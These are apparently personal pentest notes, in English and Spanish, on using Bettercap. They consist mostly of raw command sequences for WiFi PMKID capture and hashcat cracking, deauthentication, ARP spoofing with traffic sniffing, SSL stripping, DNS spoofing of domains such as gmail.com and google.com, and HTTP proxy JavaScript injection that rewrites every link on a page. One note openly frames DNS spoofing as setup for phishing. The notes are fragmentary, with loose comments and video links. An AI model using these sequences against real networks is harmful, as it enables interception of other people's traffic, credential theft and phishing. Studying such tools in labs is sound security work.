---
title: "Bettercap"
date: 2025-02-16T23:14:38-03:00
tags: ['wifi']
---
```console
sudo su
airmon-ng start wlan0
bettercap
set wifi.interface wlan0mon
wifi.recon on
wifi.show
```

We now need to associate with an access point using the BSSID. 

```console
wifi.assoc 68:14:01:5a:0e:9c
```

Similarly, if you want to capture PMKID of all the Access Points, 

```console
wifi.assoc all
```

We now need to convert this pcap file in Hashcat format and crack it as we did
before, so: 

```console
hcxpcaptool -z hashpmkid bettercap-wifi-handshake.pcap
hashcat -m 16800 --force hashpmkid /usr/share/wordlists/rockyou.txt --show
```


https://www.youtube.com/watch?v=krMaMcIX0Kc&pp=ygUQI2thbGlsaW51eGJyYXppbA%3D%3D

https://www.youtube.com/watch?v=Jg8bF_CnSAU

https://www.youtube.com/watch?v=sDTy32H9Hww&pp=ygUJI2FycHNwb29m

```bash
help
net.probe on
net.show
set arp.spoof.targets 192.168.1.58
arp.spoof on
net.sniff on
net.sniff off
clear
set dns.spoof.domains myamazon.com
dns.spoof on
help http.proxy
set http.proxy.injectjs ./java-script.js  
http.proxy on
```

```javascript
window.onload = function(){
    console.log("Hacked website");
    anchors = document.getElementsByTagName("a");
    for (var i = 0; i < anchors.length; i++){
        anchors[i].href = "https://www.hackthissite.org";
    }
}
```

```bash
http.proxy on
caplets.show
net.probe on
help arp.spoof
set arp.spoof.internal true
set arp.spoof.targets 192.168.94.128
arp.spoof on
set net.sniff.output /home/esotericwarfare/pentest.pcap
set net.sniff.verbose true
net.sniff on
set https.proxy.sslstrip true
sudo wireshark /home/esotericwarfare/pentest.pcap
Buscar por http
Botón derecho - Follow - HTTP Stream
help dns.spoof
ping victim_website.com
set dns.spoof.address ip_victim_website.com
set dns.spoof.domains gmail.com,www.gmail.com,https://gmail.com
dns.spoof on
dns.spoof off
set dns.spoof.domains google.com,www.google.com,https://google.com/gmail/about/
dns.spoof on
set dns.spoof.address 192.168.94.133
dns.spoof off
dns.spoof on
set dns.spoof.all true
set dns.spoof.domains testphp.vulnweb.com/login.php,testphp.vulnweb.com,vulnweb.com
dns.spoof on
set wifi.recon.channel 3
set net.sniff.verbose true
set net.sniff.output wpa.pcap
net.sniff on
wifi.show
wifi.deauth bbsid
exit
Abrí la captura wpa.pcap con wireshark
y podés romper el cifrado con aircrack o wpa auditor
help arp.spoof
arp.spoof on
set arp.spoof.fullduplex true
arp -a 
set arp.spoof.targets 192.168.73.134
arp.spoof on
ahora volvé a ejecutar arp -a y verás ips cambiadas
---

net.probe on
net.show
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.223.18
arp.spoof on
net.sniff on
---
net.probe on
set arp.spoof.targets 10.0.0.3 10.0.0.1
arp.spoof on
net.sniff on
net.sniff off
clear
sudo service apache2 start
set dns.spoof.domains merdeces.com
dns.spoof on
Ahora mercedes.com redirige a una pagina local, así podemos hacer un ataque de phishing 
---
caplets.update
https://hstspreload.org
```

https://www.youtube.com/watch?v=iU1jwD8mwZk

https://www.youtube.com/watch?v=I0DVb8Op248&pp=ygUNI25pZmZwYXNzd29yZA%3D%3D

https://www.youtube.com/watch?v=6oZsqMqr_vc

https://www.youtube.com/watch?v=q3KJGhcc7g4

https://www.youtube.com/watch?v=FcZdiYQy2L0&pp=ygUUI2RlY3J5cHRpbmdhbm9ueW1pdHk%3D

https://www.youtube.com/watch?app=desktop&v=XSmhO7I2XdQ&t=9s

https://www.youtube.com/watch?v=w_k4d8n_2HE

https://www.youtube.com/watch?v=Peu0AEpHUVs

https://www.youtube.com/watch?v=yXsZFvochqw

https://www.youtube.com/watch?v=m-H9W9ZOzBI

https://www.youtube.com/watch?v=-rSqbgI7oZM

https://www.youtube.com/watch?v=jcffMHk_TZA

https://www.youtube.com/watch?v=ST1aUXFzY00&vl=en

https://www.youtube.com/watch?v=oqUX-YH1-Ao


